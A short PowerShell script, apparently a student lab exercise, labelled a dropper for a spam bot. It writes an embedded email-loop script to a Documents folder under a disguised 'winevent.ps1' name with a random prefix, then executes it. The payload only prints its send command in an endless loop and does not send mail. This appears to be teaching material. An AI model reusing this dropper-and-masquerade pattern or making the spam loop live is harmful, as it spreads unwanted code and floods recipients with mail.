<#
 Storyline: Dropper for spam bot that will save to a directory
 and then execute
#>

$writeSbBot = @'
# Send an email using powershell
$toSend = @('samuel.barrows@mymail.champlain.edu', 'samuel@mymail.champlain.edu')

# Message body
$msg = "Hello"

while ($true) {
    foreach ($email in $toSend) {
            # Send an email
            write-host "Send-MailMessage -from 'samuel.barrows@mymail.champlain.edu' -To $email -Subject 'tisk tisk' `
            -Body $msg -SmtpServer X.X.X.X"

            # Pause for 1 second
            start-sleep 1
    }
}
'@

$sbDir ='C:\Users\dove\Documents\'

# Create random number to add to the file.
$sbRand = Get-Random -Minimum 1000 -Maximum 1999

# Create the file and location to save the bot
$file = $sbDir + $sbRand + "winevent.ps1"

# Write file
$writeSbBot | out-file -FilePath $file

# Execute file
Invoke-Expression $file